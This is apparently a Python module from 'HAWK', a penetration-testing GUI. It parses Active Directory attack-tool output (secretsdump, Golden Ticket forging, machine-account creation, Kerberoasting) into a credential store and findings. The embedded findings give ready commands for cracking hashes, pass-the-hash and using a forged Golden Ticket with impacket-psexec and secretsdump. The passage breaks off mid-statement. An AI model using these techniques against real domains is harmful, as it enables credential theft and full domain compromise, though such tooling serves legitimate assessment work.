# HAWK — Hostile Assessment War-Kit
# Copyright 2026 Lorenzo Serafini
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# A copy of the License is provided in the LICENSE file at the root
# of this distribution, or at http://www.apache.org/licenses/LICENSE-2.0
#
# Attribution "Created by Lorenzo Serafini" must be preserved in all
# redistributed and Derivative Works — see NOTICE for details.

"""
HAWK - Kill Chain Card Widget v1.0
- Port-aware routing for all tools
- Hydra: wordlist dropdown from metasploit/seclists + browse
- MSF card: check DB + guide user
- Nmap custom: free command field
- Right-click context menu on all entries
- smbclient/crackmapexec → auto-populate intel
- ssh_banner/ftp_anon port-aware fix
- No popup for 0 ports found
- WinRM excluded from HTTP tools
"""

import customtkinter as ctk
import tkinter as tk
import os
import re
import glob
import time
import subprocess
import threading
import shlex
import json
import zipfile
import tempfile
import shutil
import socket
import random
import string
import uuid
from datetime import datetime
from pathlib import Path

from utils.runner import ToolRunner, MultiRunner, MetasploitRunner, GreenBoneRunner
from utils.session import Credential
from gui.widgets.card_common import *


def _bloodhound_extract_stats(users, computers, groups):
    """Pure extraction of the interesting BloodHound stats from the three
    parsed JSON collections.  Split out of _parse_bloodhound_to_intel so
    the counting rules are unit-testable without a ZIP on disk.

    Returns a dict with:
      user_names        every user samAccountName/name (pushed to session)
      kerberoastable    users with an SPN worth roasting — krbtgt and
                        disabled accounts are EXCLUDED: krbtgt always
                        carries kadmin/changepw and is disabled, and the
                        KDC won't issue a TGS for a disabled account, so
                        neither is a real kerberoast target
      asrepable         users flagged 'do not require pre-auth'
      unconstrained_pcs computers with unconstrained delegation
      da_members        Domain/Enterprise Admins members, resolved to
                        display names and deduped (a principal in both
                        groups is counted once)
    """
    users = users or []
    computers = computers or []
    groups = groups or []

    # SID -> display name, so group members (stored by BloodHound as
    # ObjectIdentifier SIDs) can be shown by name, not an opaque SID.
    sid_to_name = {}
    for obj in list(users) + list(computers) + list(groups):
        oid = obj.get("ObjectIdentifier") or ""
        p = obj.get("Properties", {}) or {}
        nm = p.get("name") or p.get("samaccountname") or ""
        if oid and nm:
            sid_to_name[oid] = nm

    user_names, kerberoastable, asrepable = [], [], []
    for u in users:
        props = u.get("Properties", {}) or {}
        name = props.get("name") or props.get("samaccountname") or ""
        if name:
            user_names.append(name)
        if props.get("hasspn"):
            sam = (props.get("samaccountname")
                   or (name.split("@")[0] if name else "")).lower()
            if sam != "krbtgt" and props.get("enabled", True) is not False:
                kerberoastable.append(name)
        if props.get("dontreqpreauth"):
            asrepable.append(name)

    da_members = []
    for g in groups:
        props = g.get("Properties", {}) or {}
        gname = (props.get("name") or "").upper()
        if gname.startswith(("DOMAIN ADMINS@", "ENTERPRISE ADMINS@")):
            for m in (g.get("Members") or []):
                oid = m.get("ObjectIdentifier", "")
                da_members.append(sid_to_name.get(oid, oid))
    # A principal can sit in both Domain and Enterprise Admins — once only.
    _seen = set()
    da_members = [x for x in da_members
                  if not (x in _seen or _seen.add(x))]

    unconstrained_pcs = []
    for c in computers:
        props = c.get("Properties", {}) or {}
        if props.get("unconstraineddelegation"):
            unconstrained_pcs.append(props.get("name", ""))

    return {
        "user_names":        user_names,
        "kerberoastable":    kerberoastable,
        "asrepable":         asrepable,
        "unconstrained_pcs": unconstrained_pcs,
        "da_members":        da_members,
    }


class CardADParserMixin:
    def _parse_secretsdump_to_intel(self, tool, log: list) -> bool:
        """Parse impacket-secretsdump output, push every credential
        into the Credential Store as a proper hash entry (editable /
        crackable from the store UI), and drop a SUMMARY into Target
        Intel so the user doesn't have to re-scan the raw log to see
        what was dumped.

        Recognises three output shapes:
          • NTLM:   user:RID:LMhash:NThash:::
          • DCC2:   $DCC2$10240#domain\\user#hash
          • TGS/TGT: $krb5tgs$23$user$REALM$... / $krb5pa$ ...

        All three survive pasting into hashcat and john — we save the
        whole line as hash_val so the Credential Store "CRACK" button
        works without further massaging.
        """
        import re
        from utils.session import Credential
        target = self._get_target() or "target"

        # user:RID:LMhash:NThash:::
        # (LM hash is always aad3b... for disabled LM, we don't care)
        NTLM_RE = re.compile(
            r"^([^:\s]+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::\s*$")
        DCC2_RE = re.compile(r"^(\$DCC2\$10240#[^\s]+)$")
        KRB_RE  = re.compile(r"^(\$krb5(?:tgs|pa|asrep|tgt)\$[^\s]+)$")

        ntlm   = []     # list of (user, rid, lm, nt)
        dcc2   = []     # list of strings
        kerbs  = []     # list of strings
        # Detect a few "interesting" marker lines worth surfacing in
        # the finding summary even if they aren't credentials.
        notes  = []

        for _, raw in log:
            line = self._strip_ansi(raw).strip()
            if not line:
                continue

            m = NTLM_RE.match(line)
            if m:
                ntlm.append(m.groups())
                continue
            m = DCC2_RE.match(line)
            if m:
                dcc2.append(m.group(1))
                continue
            m = KRB_RE.match(line)
            if m:
                kerbs.append(m.group(1))
                continue
            if ("[*] Target system bootKey" in line
                    or "[*] Dumping local SAM hashes" in line
                    or "[*] Dumping cached domain logon"   in line
                    or "[*] Dumping LSA Secrets"           in line
                    or "[*] Using the DRSUAPI method"      in line):
                notes.append(line.lstrip("[* ]").rstrip(":"))

        if not (ntlm or dcc2 or kerbs):
            return False

        # Single run_id tying every pushed cred to the Target Intel
        # finding below — enables the →INTEL / 🔑 CREDS navigation.
        from utils.run_id import new_run_id, TOOL_RUN_CATEGORY
        rid = new_run_id()

        # ── Push every credential into the Credential Store ─────────
        added = 0
        if hasattr(self.app, "cred_store"):
            for user, rid_, lm, nt in ntlm:
                # Build a hashcat-friendly full line so CRACK can pick
                # it up in mode 1000 (NTLM) without stripping.
                full_ntlm = f"{user}:{rid_}:{lm}:{nt}:::"
                try:
                    self.app.cred_store.add_credential(Credential(
                        username=user,
                        password="",
                        cred_type="hash",
                        hash_val=full_ntlm,
                        hash_type="NTLM",
                        services=["SMB", "AD"],
                        source_phase=self.phase_id,
                        host=target,
                        notes=(f"Hash from impacket-secretsdump on "
                               f"{target}.\n"
                               f"RID:  {rid_}\n"
                               f"NT:   {nt}\n"
                               f"Crack:  hashcat -m 1000 {nt} rockyou.txt"),
                        linked_run_id=rid,
                        category=TOOL_RUN_CATEGORY,
                        # A dumped hash is loot, not a proven login.
                        verified=False))
                    added += 1
                except Exception as e:
                    print(f"[HAWK] cred store add (NTLM) failed: {e}")

            for h in dcc2:
                # Domain Cached Credentials v2 — hashcat -m 2100
                user_m = re.search(r"#([^#\s]+\\[^#\s]+)#", h)
                user = user_m.group(1) if user_m else "cached-user"
                try:
                    self.app.cred_store.add_credential(Credential(
                        username=user,
                        password="",
                        cred_type="hash",
                        hash_val=h,
                        hash_type="DCC2",
                        services=["AD"],
                        source_phase=self.phase_id,
                        host=target,
                        notes=(f"DCC2 (Domain Cached) hash from "
                               f"secretsdump on {target}.\n"
                               f"Crack:  hashcat -m 2100 "
                               f"<hash> rockyou.txt"),
                        linked_run_id=rid,
                        category=TOOL_RUN_CATEGORY,
                        # Uncracked DCC2 blob — nothing authenticated.
                        verified=False))
                    added += 1
                except Exception as e:
                    print(f"[HAWK] cred store add (DCC2) failed: {e}")

            for h in kerbs:
                # Krb5 TGS (Kerberoast) → -m 13100, AS-REP → -m 18200
                mode = "13100" if "krb5tgs" in h else "18200"
                user_m = re.search(r"\*([^\*$]+)\$", h)
                user = user_m.group(1) if user_m else "kerb-user"
                try:
                    self.app.cred_store.add_credential(Credential(
                        username=user,
                        password="",
                        cred_type="hash",
                        hash_val=h,
                        hash_type=("Kerberos TGS" if mode == "13100"
                                    else "Kerberos AS-REP"),
                        services=["AD"],
                        source_phase=self.phase_id,
                        host=target,
                        notes=(f"Kerberos hash from secretsdump on "
                               f"{target}.\n"
                               f"Crack:  hashcat -m {mode} "
                               f"<hash> rockyou.txt"),
                        linked_run_id=rid,
                        category=TOOL_RUN_CATEGORY,
                        # Uncracked Kerberos hash — nothing
                        # authenticated.
                        verified=False))
                    added += 1
                except Exception as e:
                    print(f"[HAWK] cred store add (Krb) failed: {e}")

        # ── Build the Target Intel SUMMARY ──────────────────────────
        # Per user request: show EVERY extracted user + DCC2 + Kerb
        # entry (not just the first 5).  The finding-info dialog is
        # already scrollable (CTkScrollableFrame), so a long
        # description simply scrolls — readability wins over brevity.
        # The full hash is shown on each line (operator asked to be able
        # to read/copy the whole hash straight from the finding).  The
        # info dialog's description is a word-wrap CTkTextbox, so long
        # hashes wrap instead of being clipped, and every char is
        # selectable; the same hashes also live in the Credential Store.
        parts = [
            f"secretsdump succeeded on {target}.",
            f"",
            f"  NTLM hashes:       {len(ntlm)}",
            f"  DCC2 cached logon: {len(dcc2)}",
            f"  Kerberos blobs:    {len(kerbs)}",
            f"",
            f"→ All {added} credential{'s' if added != 1 else ''} "
            f"added to the Credential Store as HASH entries.",
            f"  Use the CRACK button in the Credential Store to run "
            f"hashcat / john against each one.",
        ]
        if notes:
            parts.append("")
            parts.append("Dump sequence:")
            for n in notes:
                parts.append(f"  · {n}")

        # All NTLM users (was: first 5).
        if ntlm:
            parts.append("")
            parts.append(f"Users extracted ({len(ntlm)} total):")
            for user, rid_, lm, nt in ntlm:
                parts.append(
                    f"  · {user:<24}  RID {rid_:<6}  NT: {nt}")

        # All DCC2 cached logons.
        if dcc2:
            parts.append("")
            parts.append(
                f"Cached domain logons / DCC2 ({len(dcc2)} total):")
            for entry in dcc2:
                # Each DCC2 entry from secretsdump looks like:
                #   DOMAIN/user:$DCC2$10240#user#hash
                # Show the user + the full $DCC2$ hash (crackable as-is).
                if "$DCC2$" in entry:
                    head = entry.split("$DCC2$", 1)[0]
                    tail = entry.split("$DCC2$", 1)[1]
                    parts.append(f"  · {head}")
                    parts.append(f"      $DCC2${tail}")
                else:
                    parts.append(f"  · {entry}")

        # All Kerberos hashes (TGS / AS-REP).
        if kerbs:
            parts.append("")
            parts.append(
                f"Kerberos hashes ({len(kerbs)} total):")
            for h in kerbs:
                # Hash strings start with "$krb5tgs$..." or
                # "$krb5asrep$..." — show the type marker + the
                # principal (between *...$), then the full hash on its
                # own line (word-wrapped in the info dialog).
                kind = ("TGS / Kerberoast"
                        if "krb5tgs" in h.lower() else
                        "AS-REP roastable"
                        if "krb5asrep" in h.lower() else
                        "Krb hash")
                user_m = re.search(r"\*([^\*$]+)\$", h)
                u = user_m.group(1) if user_m else "?"
                parts.append(f"  · {u:<24}  [{kind}]")
                parts.append(f"      {h}")

        desc = "\n".join(parts)
        severity = "critical" if ntlm else "high"
        title = (f"SECRETSDUMP — {len(ntlm)} NTLM + "
                 f"{len(dcc2)} DCC2 + {len(kerbs)} Kerberos "
                 f"hashes on {target}")

        # replace=True: secretsdump is a snapshot (a re-run re-dumps the
        # whole NTDS), so overwrite the description instead of appending —
        # otherwise an old run's truncated hashes stay stacked above the
        # new run's full ones ("half the hashes look broken").
        self.app.after(0, lambda: self.app.target_intel.add_auto_finding(
            title=title, description=desc,
            severity=severity, source=tool.name,
            linked_run_id=rid, replace=True))

        # ── Password reuse: identical NT hash = identical password ──
        # Group the dumped NT hashes; any hash shared by 2+ accounts is
        # password reuse.  The operator asked to be SIGNALLED (not to
        # have it auto-cracked), so raise a dedicated finding — they can
        # crack one and own the group, or pass-the-hash straight away.
        _EMPTY_NT = "31d6cfe0d16ae931b73c59d7e0c089c0"   # NT of ""
        by_nt = {}
        for _u, _rid, _lm, _nt in ntlm:
            key = (_nt or "").lower()
            if not key or key == _EMPTY_NT:
                continue   # blank / disabled accounts are not "reuse"
            by_nt.setdefault(key, []).append(_u)
        reuse = {k: v for k, v in by_nt.items() if len(v) > 1}
        if reuse:
            n_accts = sum(len(v) for v in reuse.values())
            rparts = [
                f"{n_accts} account(s) across {len(reuse)} distinct "
                f"password(s) share an NTLM hash on {target}.  Identical "
                f"NT hash = identical cleartext password: crack ONE and "
                f"you own the whole group, or pass-the-hash immediately "
                f"(no cracking needed).",
                "",
            ]
            for _nt, _us in sorted(reuse.items(),
                                   key=lambda kv: -len(kv[1])):
                rparts.append(f"  NT {_nt}  —  {len(_us)} accounts:")
                for _u in _us:
                    rparts.append(f"    · {_u}")
                rparts.append("")
            r_title = (f"PASSWORD REUSE — {n_accts} accounts share a "
                       f"hash on {target}")
            r_desc = "\n".join(rparts).rstrip()
            self.app.after(0, lambda t=r_title, d=r_desc:
                self.app.target_intel.add_auto_finding(
                    title=t, description=d,
                    severity="high", source=tool.name,
                    linked_run_id=rid, replace=True))
            self.app.terminal.write(
                f"  [!] PASSWORD REUSE — {n_accts} accounts share "
                f"{len(reuse)} NT hash(es).  See Target Intel.", "warn")

        self.app.terminal.write(
            f"  [+] SECRETSDUMP — {added} hashes added to Credential "
            f"Store as HASH entries (crackable via hashcat / john).",
            "success")
        return True

    def _parse_ticketer_to_intel(self, tool, log: list) -> bool:
        """impacket-ticketer output — a forged Golden/Silver ticket.

        Ticketer runs ENTIRELY OFFLINE: it signs a Kerberos TGT with
        the krbtgt NTLM hash and writes a .ccache.  The generic fallback
        filed this as a low 'info' finding with a truncated log dump —
        wrong: a Golden Ticket is full domain-wide persistence.  We emit
        a dedicated CRITICAL finding that says WHO was impersonated,
        WHERE the ticket landed, HOW to use it, and how to remediate.

        Success is signalled by the 'Saving ticket in <file>.ccache'
        line; without it we let the generic fallback handle the output.
        """
        import re
        from utils.run_id import new_run_id

        target = self._get_target() or "target"
        text = "\n".join(self._strip_ansi(ln) for _, ln in log)

        m_save = re.search(r"Saving ticket in\s+(\S+)", text)
        if not m_save:
            return False   # not a successful forge — leave the fallback
        ccache = m_save.group(1)

        m_cust = re.search(
            r"Customizing ticket for\s+(\S+?)/(\S+)", text)
        if m_cust:
            domain, user = m_cust.group(1), m_cust.group(2)
        else:
            # Derive the impersonated user from the ccache name as a
            # fallback (ticketer names it <user>.ccache by default).
            user = ccache.rsplit("/", 1)[-1]
            user = re.sub(r"\.ccache$", "", user) or "?"
            domain = "?"

        rid = new_run_id()
        # The result block (what was forged) keeps the REAL values; the
        # usage commands are a reusable template with <DC-IP> / <DOMAIN>
        # / <DC-FQDN> placeholders the operator fills for the target.
        # The impersonated user and the .ccache name stay real — they
        # are the concrete product of THIS run.
        desc = (
            f"Golden Ticket forged OFFLINE and saved to {ccache}.\n"
            f"\n"
            f"  Impersonated : {user}@{domain}\n"
            f"  Signed with  : krbtgt NTLM hash (domain {domain})\n"
            f"  Ticket file  : {ccache}  (in HAWK's working directory)\n"
            f"\n"
            f"Impact: a forged Kerberos TGT that authenticates as "
            f"{user}.  A Golden Ticket is signed by krbtgt itself, so "
            f"the KDC trusts it for ANY service in the domain — with a "
            f"privileged principal (Administrator / Domain Admin) that "
            f"is full domain compromise.  It stays valid until the "
            f"krbtgt password is rotated TWICE (Microsoft's "
            f"double-tap); rotating {user}'s own password does NOT "
            f"revoke it.\n"
            f"\n"
            f"Use it — pass-the-ticket from a Kali shell, run in HAWK's "
            f"working directory (where {ccache} was saved).  Fill the "
            f"<DC-IP> / <DOMAIN> / <DC-FQDN> placeholders for your "
            f"target:\n"
            f"\n"
            f"  # 1. locate the forged ticket (ticketer wrote it to "
            f"HAWK's cwd)\n"
            f"  ls -l {ccache}\n"
            f"\n"
            f"  # 2. make the DC FQDN resolve — a Kerberos service "
            f"ticket is bound to the DC hostname, not its IP, so the "
            f"name must resolve (one-off /etc/hosts entry)\n"
            f"  echo '<DC-IP> <DC-FQDN>' | sudo tee -a /etc/hosts\n"
            f"\n"
            f"  # 3. point Kerberos at the ticket, then confirm it "
            f"loaded\n"
            f"  export KRB5CCNAME={ccache}\n"
            f"  klist\n"
            f"\n"
            f"  # 4. authenticate WITH the ticket: -k reads "
            f"KRB5CCNAME, -no-pass skips the password, -dc-ip points "
            f"the KDC lookup at the DC\n"
            f"  impacket-psexec -k -no-pass -dc-ip <DC-IP> "
            f"<DOMAIN>/{user}@<DC-FQDN>\n"
            f"  impacket-secretsdump -k -no-pass -dc-ip <DC-IP> "
            f"<DOMAIN>/{user}@<DC-FQDN>\n"
            f"\n"
            f"  Note: run these in the SAME shell (export is "
            f"per-shell), and the DC clock must be within 5 min of "
            f"this host or the ticket fails with KRB_AP_ERR_SKEW.\n"
            f"\n"
            f"Remediation: reset the krbtgt password TWICE (e.g. "
            f"Microsoft's New-KrbtgtKeys.ps1) to invalidate every "
            f"existing golden ticket, then investigate how krbtgt / "
            f"DCSync access was obtained.")
        title = f"GOLDEN TICKET forged — {user}@{domain} on {target}"

        # replace=True: re-forging re-writes the same ticket, so
        # overwrite rather than stacking duplicate finding bodies.
        self.app.after(0, lambda: self.app.target_intel.add_auto_finding(
            title=title, description=desc,
            severity="critical", source=tool.name,
            linked_run_id=rid, replace=True))
        self.app.terminal.write(
            f"  [!] GOLDEN TICKET forged for {user}@{domain} — "
            f"CRITICAL, see Target Intel.", "error")
        return True

    def _parse_addcomputer_to_intel(self, tool, log: list) -> bool:
        """impacket-addcomputer output — handles three scenarios:

        1. SUCCESS:
             [*] Successfully added machine account HAWK$ with password Hawk123!.
           → push cred to Credential Store + finding to Target Intel.

        2. ALREADY EXISTS (re-run with same name):
             [!] Machine account HAWK$ already exists (or
             [-] SAM domain prova: STATUS_DUPLICATE_NAME)
           → push info finding explaining the no-op + suggest -delete
             or a fresh -computer-name.

        3. UNKNOWN (cmd ran but we didn't match either pattern):
           → push a generic "addcomputer ran — check terminal output"
             finding so the user doesn't see 'No notable findings' on
             a tool run that clearly produced output.
        """
        import re
        from utils.session import Credential
        from utils.run_id import new_run_id, TOOL_RUN_CATEGORY

        target = self._get_target() or "target"
        lines = [self._strip_ansi(ln).strip() for _, ln in log]
        rid = new_run_id()

        # Pattern 1 — success
        SUCCESS_RE = re.compile(
            r"Successfully added machine account "
            r"(\S+?)\s+with password\s+(\S+?)\.?\s*$")
        # Pattern 2 — already exists / conflict / fail
        ALREADY_RE = re.compile(
            r"(?i)(?:already exists|STATUS_DUPLICATE_NAME|"
            r"SAM_NEW_OBJECT_EXISTS|account name is being used)")
        FAIL_RE = re.compile(
            r"(?i)\b(STATUS_\w+|ERROR|FAIL|Unable to|Could not)\b")

        m_success = None
        m_already = False
        m_fail_line = None
        for ln in lines:
            if not m_success:
                m_success = SUCCESS_RE.search(ln)
                if m_success:
                    break
            if ALREADY_RE.search(ln):
                m_already = True
                m_fail_line = ln
                break
            if FAIL_RE.search(ln) and "Successfully" not in ln:
                m_fail_line = m_fail_line or ln

        # Compute the machine-name the user asked to create, from the
        # cmd they ran — useful in the "already exists" / unknown
        # branches to identify which account.
        cmd_line = ""
        for _lvl, raw in log:
            if "impacket-addcomputer" in raw:
                cmd_line = raw
                break
        req_name = None
        req_pass = None
        m_cn = re.search(r"-computer-name\s+'?(\S+?)'?\s", cmd_line)
        m_cp = re.search(r"-computer-pass\s+'?(\S+?)'?\s", cmd_line)
        if m_cn:
            req_name = m_cn.group(1)
        if m_cp:
            req_pass = m_cp.group(1)

        # ── Branch 1: success ───────────────────────────────────────
        if m_success:
            computer = m_success.group(1)
            password = m_success.group(2)
            try:
                self.app.cred_store.add_credential(Credential(
                    username=computer,
                    password=password,
                    cred_type="cleartext",
                    services=["AD", "Computer"],
                    source_phase=self.phase_id,
                    host=target,
                    notes=(f"Computer account created via impacket-"
                           f"addcomputer on {target}.\n"
                           f"Use as 'delegate-from' in RBCD attacks.\n"
                           f"Remove with (auth as a user allowed to):\n"
                           f"  impacket-addcomputer -delete -computer-name "
                           f"{computer} -dc-ip <DC-IP> "
                           f"'<DOMAIN>/<USER>:<PASSWORD>'"),
                    linked_run_id=rid,
                    category=TOOL_RUN_CATEGORY,
                    # The account was created, never logged into.
                    verified=False))
            except Exception as e:
                print(f"[HAWK] addcomputer cred push failed: {e}")

            self.app.after(0, lambda:
                self.app.target_intel.add_auto_finding(
                    title=f"ADD COMPUTER — {computer} created on "
                          f"{target}",
                    description=(
                        f"Successfully created a new AD computer "
                        f"account via MachineAccountQuota (default "
                        f"quota = 10 per user).\n\n"
                        f"Username : {computer}\n"
                        f"Password : {password}\n\n"
                        f"This account is now in the domain and can be "
                        f"used as:\n"
                        f"  • '-delegate-from' in RBCD attack chains\n"
                        f"  • Pivot for Kerberos S4U2self/S4U2proxy abuse\n"
                        f"  • Baseline 'low-priv machine account' to "
                        f"test AD ACLs\n\n"
                        f"Cleanup when done — delete the account (auth as "
                        f"a user allowed to, e.g. the one that created "
                        f"it):\n"
                        f"  impacket-addcomputer -delete -computer-name "
                        f"{computer} -dc-ip <DC-IP> "
                        f"'<DOMAIN>/<USER>:<PASSWORD>'"),
                    severity="high", source=tool.name,
                    linked_run_id=rid))

            self.app.terminal.write(
                f"  [+] addcomputer — {computer}:{password} added to "
                f"AD RESULTS in Credential Store.", "success")
            return True

        # ── Branch 2: already exists / duplicate name ──────────────
        if m_already and req_name:
            self.app.after(0, lambda:
                self.app.target_intel.add_auto_finding(
                    title=f"ADD COMPUTER — '{req_name}' already exists "
                          f"on {target}",
                    description=(
                        f"The computer account '{req_name}' was already "
                        f"present in AD before this run (probably from "
                        f"a previous HAWK session).  impacket-addcomputer "
                        f"did NOT create anything new this time.\n\n"
                        f"Observed error line:\n"
                        f"  {m_fail_line or '(duplicate detected in stdout)'}"
                        f"\n\nOptions:\n"
                        f"  • Reuse the existing account — its cred "
                        f"should already be in the Credential Store "
                        f"from the earlier run.\n"
                        f"  • Run with a different -computer-name, e.g. "
                        f"'HAWK2$'.\n"
                        f"  • Delete the existing one first (auth as a "
                        f"user allowed to):\n"
                        f"    impacket-addcomputer -delete -computer-"
                        f"name {req_name} -dc-ip <DC-IP> "
                        f"'<DOMAIN>/<USER>:<PASSWORD>'"),
                    severity="info", source=tool.name,
                    linked_run_id=rid))
            self.app.terminal.write(
                f"  [*] addcomputer — '{req_name}' already exists, "
                f"no new cred pushed.", "dim")
            return True

        # ── Branch 3: detected a fail line (LDAP referral, STATUS_*,
        #             "Could not...", "Unable to...") even without an
        #             explicit duplicate-name marker.  Most common
        #             cause: wrong target_domain in the cmd line, so
        #             the DC returns LDAP referral 0000202B and
        #             impacket bails before adding anything.  We
        #             surface this as MEDIUM severity (not info) so
        #             the user sees the failure clearly + give a
        #             diagnostic checklist.
        if m_fail_line:
            # Try to classify common failure modes for sharper hints.
            fail_l = m_fail_line.lower()
            if "0000202b" in fail_l or "referr" in fail_l:
                hint = ("LDAP referral (0000202B) — the DC at "
                        f"{target} is NOT authoritative for the "
                        f"domain in your command line.  Check the "
                        f"TARGET DOMAIN field in HAWK's target bar — "
                        f"it must match the AD domain on this DC "
                        f"(typically discovered earlier via LDAPSEARCH "
                        f"or NETEXEC LDAP).")
            elif "machineaccountquota" in fail_l or "quota" in fail_l:
                hint = ("MachineAccountQuota reached — the user you "
                        f"authenticated as has already created the "
                        f"max number of computer accounts (default 10). "
                        f"Reuse one of the existing ones, or "
                        f"authenticate as a different domain user.")
            elif ("status_access_denied" in fail_l
                    or "insufficient" in fail_l
                    or "ldap_no_such_object" in fail_l):
                hint = ("Access denied — the user you authenticated as "
                        f"can't write a new computer account.  This "
                        f"usually means MachineAccountQuota = 0 OR "
                        f"GPO restriction on 'Add workstations to "
                        f"domain'.  Try a different user (Domain Admin "
                        f"will always work).")
            elif ("status_logon_failure" in fail_l
                    or "invalidcredentials" in fail_l
                    or "data 52e" in fail_l):
                hint = ("Authentication failed — username, password "
                        f"or hash in the command is wrong.  Re-check "
                        f"the Credential Store entry that pre-filled "
                        f"the dialog.")
            else:
                hint = ("Unclassified failure — paste the error line "
                        f"into a search engine for impacket-specific "
                        f"diagnostics.")
            self.app.after(0, lambda hl=m_fail_line, ht=hint:
                self.app.target_intel.add_auto_finding(
                    title=f"ADD COMPUTER — failed on {target}",
                    description=(
                        f"impacket-addcomputer reported a failure.\n\n"
                        f"Failing line:\n  {hl}\n\n"
                        f"Diagnosis:\n  {ht}\n\n"
                        f"Requested name : {req_name or '(unknown)'}\n"
                        f"Requested pass : {req_pass or '(unknown)'}\n"
                        f"Target DC       : {target}\n\n"
                        f"Re-run after fixing the underlying issue — "
                        f"NO credential was added to the Credential "
                        f"Store this time."),
                    severity="medium", source=tool.name,
                    linked_run_id=rid))
            self.app.terminal.write(
                f"  [!] addcomputer — failed: {m_fail_line[:120]}",
                "error")
            return True

        # ── Branch 4: unknown but rc=0 → generic acknowledgment ────
        # Prevents 'No notable findings' on a tool that clearly ran.
        # Surfaces the last 6 non-empty output lines so the user has
        # context even without a structured parser hit.
        non_empty = [ln for ln in lines if ln and not ln.startswith("[HAWK]")]
        tail = "\n".join(non_empty[-6:]) if non_empty else "(empty output)"
        self.app.after(0, lambda:
            self.app.target_intel.add_auto_finding(
                title=f"ADD COMPUTER — unrecognised output on {target}",
                description=(
                    f"impacket-addcomputer ran to completion but HAWK "
                    f"didn't find either the success line ('Successfully "
                    f"added machine account ...') or a duplicate-name "
                    f"error in the output.  The command may have been "
                    f"rejected silently, or the output format changed "
                    f"in a newer impacket release.\n\n"
                    f"Last output lines:\n{tail}\n\n"
                    f"Check the AD side manually — if the account exists, "
                    f"add it to the Credential Store by hand (username "
                    f"{req_name or '(the -computer-name you supplied)'}, "
                    f"password "
                    f"{req_pass or '(the -computer-pass you supplied)'})."),
                severity="info", source=tool.name,
                linked_run_id=rid))
        self.app.terminal.write(
            f"  [*] addcomputer — output format not recognised, "
            f"acknowledgment finding pushed.", "dim")
        return True

    def _parse_kerberoast_to_intel(self, tool, log: list) -> bool:
        """GetUserSPNs / Kerberoast output parser.

        Output comes in two places:
          1. stdout table listing SPN users
          2. -outputfile on disk with hashcat-format hashes
        We parse both.  Hashes get pushed as Kerberos TGS creds;
        user table goes into a summary finding.
        """
        import os, re
        from utils.session import Credential
        from utils.run_id import new_run_id, TOOL_RUN_CATEGORY

        target = self._get_target() or "target"
        rid = new_run_id()
        lines = [self._strip_ansi(ln) for _, ln in log]

        # Hashcat-format kerberoast hashes: $krb5tgs$23$*user$REALM$...
        TGS_RE = re.compile(r"^(\$krb5tgs\$[^\s]+)$")
        hashes = []
        for ln in lines:
            m = TGS_RE.match(ln.strip())
            if m:
                hashes.append(m.group(1))

        # Also read from the -outputfile path, which contains the
        # hashes even if stdout was truncated.
        outpath = None
        for ln in lines:
            m = re.search(r"-outputfile\s+(\S+)", ln)
            if m:
                outpath = os.path.expanduser(m.group(1))
                break
        # Fall back to the default template path
        if not outpath:
            from utils.config import OUTPUTS_DIR as _OUTDIR
            outpath = os.path.join(
                _OUTDIR, f"kerberoast-{target}.txt")
        if os.path.isfile(outpath):
            try:
                with open(outpath, "r", encoding="utf-8",
                          errors="replace") as f:
                    for ln in f:
                        m = TGS_RE.match(ln.strip())
                        if m and m.group(1) not in hashes:
                            hashes.append(m.group(1))
            except Exception:
                pass

        # SPN user list from the stdout table.  GetUserSPNs prints:
        #   ServicePrincipalName        Name       MemberOf   PwdLastSet …
        # so the SPN is the FIRST column (it contains '/' and often ':')
        # and the sAMAccountName is the SECOND.  The old regex assumed the
        # username came first and only matched [\w.\-$], so it broke on the
        # '/' in the SPN and extracted NOBODY — the whole run then returned
        # False and fell through to the generic low-severity fallback
        # finding (the "KERBEROAST (GetUserSPNs) on <t>" card the operator
        # saw at severity 'low').
        ROW_RE = re.compile(r"^(\S+)\s+([\w.\-$]+)\s+\S")
        users_found = []
        for ln in lines:
            s = ln.rstrip()
            if not s or "ServicePrincipalName" in s:
                continue
            m = ROW_RE.match(s)
            # A real data row has an SPN (service/host) as column 1; that
            # '/' also skips the dashed separator line.
            if m and "/" in m.group(1):
                users_found.append(m.group(2))
        users_found = list(dict.fromkeys(users_found))

        # ── "No entries found!" — valid negative result ──────────────
        # impacket-GetUserSPNs prints exactly this line when the query
        # succeeded but the domain has no SPN-bound users at all (small
        # labs, misconfigured or brand-new domains).  Without this
        # branch we'd return False and the generic _on_done fallback
        # would add a meaningless "KERBEROAST — <target>" finding that
        # told the user nothing.  Now we explicitly claim the result,
        # emit an informational finding that explains WHY, and stop.
        joined = "\n".join(lines).lower()
        no_entries = ("no entries found" in joined
                      or "no spns found" in joined)
        if not hashes and not users_found:
            if no_entries:
                self.app.after(0, lambda:
                    self.app.target_intel.add_auto_finding(
                        title=f"KERBEROAST — no SPN users on {target}",
                        description=(
                            f"GetUserSPNs queried the DC successfully "
                            f"but the domain has no user accounts with "
                            f"a servicePrincipalName set.  Nothing to "
                            f"kerberoast here.\n\n"
                            f"What this means:\n"
                            f"  · No service accounts (SQL, IIS, web, "
                            f"SCCM, etc.) are registered with an SPN\n"
                            f"  · Typical on fresh/small labs; real "
                            f"corporate AD usually has a dozen+\n\n"
                            f"Next moves:\n"
                            f"  · AS-REP ROAST — targets users with "
                            f"'Do not require preauth' (different flag, "
                            f"different set of victims)\n"
                            f"  · BLOODHOUND — map the graph; "
                            f"kerberoastable is just one of many "
                            f"paths\n"
                            f"  · Password spray with the users you "
                            f"already enumerated"),
                        severity="info", source=tool.name,
                        linked_run_id=rid))
                self.app.terminal.write(
                    f"  [i] Kerberoast — domain has no SPN-bound "
                    f"users.  Try AS-REP roast or BloodHound next.",
                    "info")
                return True
            # Neither hashes, nor user rows, nor "No entries found" —
            # output is genuinely unparseable.  Let the generic
            # fallback handle it.
            return False

        # Push each TGS hash as a cred
        added = 0
        for h in hashes:
            user_m = re.search(r"\*([^\*$]+)\$", h)
            user = user_m.group(1) if user_m else "spn-user"
            try:
                self.app.cred_store.add_credential(Credential(
                    username=user,
                    password="",
                    cred_type="hash",
                    hash_val=h,
                    hash_type="Kerberos TGS",
                    services=["AD", "Kerberos"],
                    source_phase=self.phase_id,
                    host=target,
                    notes=(f"TGS hash from GetUserSPNs on {target}.\n"
                           f"Crack:  hashcat -m 13100 <hash> rockyou.txt\n"
                           f"If cracked → the SPN-bound service account "
                           f"password, often reused across the domain."),
                    linked_run_id=rid,
                    category=TOOL_RUN_CATEGORY,
